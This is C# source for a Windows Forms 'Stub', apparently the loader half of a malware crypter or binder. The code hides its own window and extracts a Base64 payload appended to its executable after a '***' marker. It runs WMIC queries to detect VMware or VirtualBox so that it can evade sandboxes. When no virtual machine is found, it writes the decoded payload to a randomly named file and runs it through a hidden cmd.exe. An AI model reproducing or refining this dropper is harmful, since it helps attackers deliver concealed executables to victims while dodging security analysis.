using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace Stub
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        static class RandomUtil
        {
            public static string GetRandomString()
            {
                string path = Path.GetRandomFileName();
                path = path.Replace(".", "");
                return path;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Visible = false;
            this.Hide();
            this.ShowInTaskbar = false;

            using (StreamReader streamReader = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
            {
                using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
                {
                    byte[] stubBytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
                    string stubSettings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("***")).Replace("***", "");

                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();

                    cmd.StandardInput.WriteLine("WMIC COMPUTERSYSTEM GET MANUFACTURER");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    string output = cmd.StandardOutput.ReadToEnd();

                    Process cmd2 = new Process();
                    cmd2.StartInfo.FileName = "cmd.exe";
                    cmd2.StartInfo.RedirectStandardInput = true;
                    cmd2.StartInfo.RedirectStandardOutput = true;
                    cmd2.StartInfo.CreateNoWindow = true;
                    cmd2.StartInfo.UseShellExecute = false;
                    cmd2.Start();

                    cmd2.StandardInput.WriteLine("WMIC BIOS GET SERIALNUMBER");
                    cmd2.StandardInput.Flush();
                    cmd2.StandardInput.Close();
                    cmd2.WaitForExit();
                    string output2 = cmd2.StandardOutput.ReadToEnd();

                    Process cmd3 = new Process();
                    cmd3.StartInfo.FileName = "cmd.exe";
                    cmd3.StartInfo.RedirectStandardInput = true;
                    cmd3.StartInfo.RedirectStandardOutput = true;
                    cmd3.StartInfo.CreateNoWindow = true;
                    cmd3.StartInfo.UseShellExecute = false;
                    cmd3.Start();

                    cmd3.StandardInput.WriteLine("WMIC COMPUTERSYSTEM GET MODEL");
                    cmd3.StandardInput.Flush();
                    cmd3.StandardInput.Close();
                    cmd3.WaitForExit();
                    string output3 = cmd3.StandardOutput.ReadToEnd();

                    if (output.Contains("VMware"))
                    {
                        MessageBox.Show("VMware detected");
                    }

                    else if (output2.Contains("VMWare"))
                    {
                        MessageBox.Show("VMware detected");
                    }

                    else if (output3.Contains("VirtualBox"))
                    {
                        MessageBox.Show("VirtualBox detected");
                    }

                    else
                    {
                        string fileName = RandomUtil.GetRandomString();
                        File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\" + fileName + "." + stubSettings.Split('|')[1], Convert.FromBase64String(stubSettings.Split('|')[0]));
                        MessageBox.Show("Not on a VM");
                        Process openFile = new Process();
                        openFile.StartInfo.FileName = "cmd.exe";
                        openFile.StartInfo.RedirectStandardInput = true;
                        openFile.StartInfo.RedirectStandardOutput = true;
                        openFile.StartInfo.CreateNoWindow = true;
                        openFile.StartInfo.UseShellExecute = false;
                        openFile.Start();

                        openFile.StandardInput.WriteLine(fileName + "." + stubSettings.Split('|')[1]);
                        openFile.StandardInput.Flush();
                        openFile.StandardInput.Close();
                        openFile.WaitForExit();
                        this.Close();
                    }

                }
            }
        }
    }
}
